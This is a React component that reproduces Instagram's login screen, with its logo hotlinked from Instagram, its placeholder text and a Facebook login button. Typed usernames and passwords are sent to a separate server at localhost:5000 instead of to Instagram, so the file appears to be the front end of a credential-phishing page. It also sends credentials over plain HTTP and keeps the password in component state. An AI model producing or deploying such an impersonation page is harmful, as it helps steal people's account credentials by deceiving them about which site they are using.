// src/components/LoginPage.js
import React, { useState } from 'react';
import './LoginPage.css'; // Import the CSS file for styling

function LoginPage() {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [loginDetails, setLoginDetails] = useState(null);

  const handleSubmit = async (event) => {
    event.preventDefault();
    try {
      const response = await fetch('http://localhost:5000/login', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ username, password }),
      });
      const data = await response.text();
      if (response.ok) {
        setLoginDetails({ username, password });
        alert('Login successful');
      } else {
        alert('Login failed. Please try again.');
      }
    } catch (error) {
      console.error('Error submitting login details:', error);
      alert('An error occurred. Please try again later.');
    }
  };

  return (
    <div className="login-container">
      <div className="login-box">
        <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram" className="logo" />
        <form onSubmit={handleSubmit} className="login-form">
          <input
            type="text"
            placeholder="Phone number, username, or email"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            className="input-field"
            required
          />
          <input
            type="password"
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className="input-field"
            required
          />
          <button type="submit" className="login-button">Log In</button>
        </form>
        <div className="separator">
          <div className="line"></div>
          <span>OR</span>
          <div className="line"></div>
        </div>
        <button className="facebook-button">Log in with Facebook</button>
        <a href="#" className="forgot-password">Forgot password?</a>
      </div>
      <div className="signup-link">
        <span>Don't have an account? </span>
        <a href="#">Sign up</a>
      </div>
    </div>
  );
}

export default LoginPage;